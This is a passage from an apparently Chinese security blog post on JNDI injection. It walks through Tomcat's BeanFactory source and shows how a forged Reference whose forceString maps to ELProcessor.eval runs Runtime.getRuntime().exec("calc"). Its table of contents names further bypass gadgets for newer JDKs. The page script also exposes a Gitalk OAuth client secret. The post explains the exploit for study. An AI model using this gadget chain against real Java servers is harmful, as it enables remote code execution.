valueArray[<span class="number">0</span>] = Byte.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Short.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">short</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = Short.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Integer.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">int</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = Integer.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Long.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">long</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = Long.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Float.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">float</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = Float.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Double.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">double</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = Double.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Boolean.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">boolean</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = Boolean.valueOf(value);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">                                (<span class="string">&quot;String conversion for property &quot;</span> + propName +  </span><br><span class="line">                                 <span class="string">&quot; of type &#x27;&quot;</span> + propType.getName() +  </span><br><span class="line">                                 <span class="string">&quot;&#x27; not available&quot;</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">  </span><br><span class="line">                        <span class="type">Method</span> <span class="variable">setProp</span> <span class="operator">=</span> pda[i].getWriteMethod();  </span><br><span class="line">                        <span class="keyword">if</span> (setProp != <span class="literal">null</span>) &#123;  </span><br><span class="line">                            setProp.invoke(bean, valueArray);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">                                (<span class="string">&quot;Write not allowed for property: &quot;</span>  </span><br><span class="line">                                 + propName);  </span><br><span class="line">                        &#125;  </span><br><span class="line">  </span><br><span class="line">                        <span class="keyword">break</span>;  </span><br><span class="line">  </span><br><span class="line">                    &#125;  </span><br><span class="line">  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (i == pda.length) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">                        (<span class="string">&quot;No set method found for property: &quot;</span> + propName);  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> bean;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.beans.IntrospectionException ie) &#123;  </span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ie.getMessage());  </span><br><span class="line">            ne.setRootCause(ie);  </span><br><span class="line">            <span class="keyword">throw</span> ne;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.ReflectiveOperationException e) &#123;  </span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();  </span><br><span class="line">            <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> ThreadDeath) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> (ThreadDeath) cause;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> VirtualMachineError) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> (VirtualMachineError) cause;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(e.getMessage());  </span><br><span class="line">            ne.setRootCause(e);  </span><br><span class="line">            <span class="keyword">throw</span> ne;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代码很长，但命令执行相关逻辑都在前半部分，可以分段来看</p>
+<p>首先会判断通过 RMI 获取的对象是否是 ResourceRef 实例，然后从 Reference 中获取 <code>className</code> 并加载为 <code>beanClass</code>，将其实例化为 <code>bean</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;  </span><br><span class="line"><span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();  </span><br><span class="line">Class&lt;?&gt; beanClass = <span class="literal">null</span>;  </span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span>  </span><br><span class="line">    Thread.currentThread().getContextClassLoader();  </span><br><span class="line"><span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br></pre></td></tr></table></figure></div>
+
+<p>之后解析 Reference 的 <code>forceString</code> 属性，首先按逗号进行分组，然后按等号分割为 <code>param</code> 和 <code>setterName</code>，之后再获取参数为 <code>String.class</code> 的 <code>beanClass.setterName</code> 方法 <code>method</code>，并以 <code>param</code> 为键，<code>method</code> 为值存入 HashMap</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);  </span><br><span class="line">Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">String value;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;  </span><br><span class="line">    value = (String)ra.getContent();  </span><br><span class="line">    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];  </span><br><span class="line">    paramTypes[<span class="number">0</span>] = String.class;  </span><br><span class="line">    String setterName;  </span><br><span class="line">    <span class="type">int</span> index;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Items are given as comma separated list */</span>  </span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;  </span><br><span class="line">        param = param.trim();  </span><br><span class="line">        <span class="comment">/* A single item can either be of the form name=method  </span></span><br><span class="line"><span class="comment">         * or just a property name (and we will use a standard         </span></span><br><span class="line"><span class="comment">         * setter) */</span>        </span><br><span class="line">         index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();  </span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();  </span><br><span class="line">        &#125; </span><br><span class="line">......</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>接着遍历 Reference 的属性 <code>propName</code>，以及属性 <code>propName</code> 对应的 <code>value</code>，然后从 HashMap 中取 <code>param</code> 等于 <code>propName</code> 的 <code>method</code>，并以 <code>value</code> 作为参数进行调用</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Enumeration&lt;RefAddr&gt; e = ref.getAll();  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> (e.hasMoreElements()) &#123;  </span><br><span class="line">  </span><br><span class="line">    ra = e.nextElement();  </span><br><span class="line">    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||  </span><br><span class="line">        propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||  </span><br><span class="line">        propName.equals(<span class="string">&quot;forceString&quot;</span>) ||  </span><br><span class="line">        propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">continue</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    value = (String)ra.getContent();  </span><br><span class="line">  </span><br><span class="line">    Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Shortcut for properties with explicitly configured setter */</span>  </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);  </span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;  </span><br><span class="line">        valueArray[<span class="number">0</span>] = value;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            method.invoke(bean, valueArray);  </span><br><span class="line">        &#125;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代入这个例子就是先加载为 <code>beanClass</code> 为 ELProcessor，将其实例化，之后解析 Reference 的 <code>forceString</code> 属性得到 <code>kk</code> 和 <code>eval</code>，然后把 <code>kk</code> 和 <code>ELProcessor.eval</code> 存入 HashMap，最后在遍历到 <code>propName</code> 等于 <code>kk</code> 时，获取 <code>kk</code> 的 <code>value</code> 也就是 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 作为参数，调用从 HashMap 中取出的 <code>ELProcessor.eval</code>，最终实现命令执行</p>
+<p>其实还有打 XXE 和 JDBC 的思路，挖个坑，以后再填</p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JNDI-%E6%B3%A8%E5%85%A5/">#JNDI 注入</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/pages/a92a55614521/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hexo 博客搭建</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '38af89a29ba07bec5868',
+                    clientSecret: 'e43ae113e7912c10ea29fb7668f5ff9f56b22409',
+                    repo: 'k2436165.github.io',
+                    owner: 'k2436165',
+                    admin: ['k2436165'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">JNDI 注入</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">JNDI 是什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">JNDI 工作流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2"><span class="nav-text">JNDI 动态协议转换</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-Reference"><span class="nav-text">JNDI Reference</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-%E6%B3%A8%E5%85%A5"><span class="nav-text">JNDI 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI-RMI"><span class="nav-text">JNDI+RMI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI-LDAP"><span class="nav-text">JNDI+LDAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">JNDI 注入原理分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JDK-%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="nav-text">JDK 版本限制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="nav-text">JNDI 高版本绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">LDAP+反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">LDAP+反序列化原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BeanFactory-%E6%9C%AC%E5%9C%B0%E7%B1%BB"><span class="nav-text">BeanFactory+本地类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BeanFactory-ELProcessor"><span class="nav-text">BeanFactory+ELProcessor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BeanFactory-GroovyClassLoader-GroovyShell"><span class="nav-text">BeanFactory+GroovyClassLoader&#x2F;GroovyShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BeanFactory-MVEL"><span class="nav-text">BeanFactory+MVEL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BeanFactory-SnakeYaml"><span class="nav-text">BeanFactory+SnakeYaml</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BeanFactory-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">BeanFactory 利用原理分析</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">k2436165</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        2 posts in total
+                    </span>
+                    
+                        <span>
+                            6.5k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
